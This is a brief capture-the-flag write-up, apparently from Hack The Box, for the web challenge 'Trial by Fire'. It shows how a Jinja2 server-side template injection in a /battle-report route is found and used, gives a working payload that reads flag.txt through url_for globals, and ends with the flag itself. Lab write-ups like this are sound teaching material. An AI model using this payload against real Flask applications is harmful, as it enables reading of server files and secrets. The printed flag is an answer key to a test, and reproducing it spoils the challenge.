## Trial by Fire

Category: Web  

## Challenge
Website with warrior name input.  
Found 3 main parts:
- Home page (input warrior name)  
- /flamedrake (show status)  
- /battle-report (after battle action)

Checked for SSTI by inputting
```
{{7*7}}
```
Output still showed `{{7*7}}` (escaped).

Found hidden button using DevTools (CTRL + F → search "leet").  
Clue appeared:
![image](https://github.com/user-attachments/assets/0038997c-6d0a-4c46-b834-377e607e51cb)

```
{{ url_for.globals }}
```

## Solution
After analyzing source, found:
- /flamedrake uses `render_template()` → safe  
- /battle-report uses `render_template_string()` + f-string → vulnerable  

So SSTI only works in `/battle-report`.

Final Payload:
```jinja2
{{ url_for.__globals__['__builtins__']['open']('flag.txt').read() }}
```

- POST to `/begin` with warrior_name = payload
![image](https://github.com/user-attachments/assets/2cf3f09b-0c64-4b02-bec4-e5d99f277a50)

- Trigger `/battle-report`

![image](https://github.com/user-attachments/assets/bf24535a-f708-436c-964d-c8fc2d896532)

```
HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_ab21d35eb28870ad67229305ddfd57dc}
```
